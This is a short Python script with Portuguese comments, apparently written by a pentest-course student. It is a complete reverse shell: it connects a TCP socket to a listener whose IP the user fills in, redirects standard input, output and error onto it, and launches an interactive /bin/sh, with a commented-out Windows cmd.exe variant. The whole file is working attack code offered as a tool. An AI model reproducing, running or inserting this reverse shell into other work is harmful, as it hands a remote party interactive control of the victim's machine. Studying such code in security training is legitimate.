# Desenvolvido pelo Programador: Miguel Vasco

# Por que decide criar está ferramenta?
# R: Criei está ferramenta, devido a um curso de Pentest que eu estou cursando.
# R: E eu já tenho uma pequena afinidade com o Python então foi meio suave!


import socket # importei o método socket
import subprocess # importei o subprocess
import os # importei o módulo os - operational system

# Endereço Ip e porta do listener - Configurando o IP e a Porta

SERVER_IP = "Seu Ip" # Coloque o seu ip
SERVER_PORT = 222 # Coloque a porta que você vai eatar escutando a conexão

# Iniciando um socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


# Estabelecendo ligação com o listener
s.connect((SERVER_IP,SERVER_PORT))

# Imprimindo entrada e saida
os.dup2(s.fileno(), 0) # stdin
os.dup2(s.fileno(), 1) # stdout
os.dup2(s.fileno(), 2) # stderr


# Executando um Shell em ambiente Linux
subprocess.call(["/bin/sh", "-i"])


# Executar um shell no Windows -> (cmd no Windows)
# subprocess.call(["cmd.exe", "/c", "start", "cmd.exe"])


# Use essa ferramenta com sabedória.
# O País Agradece!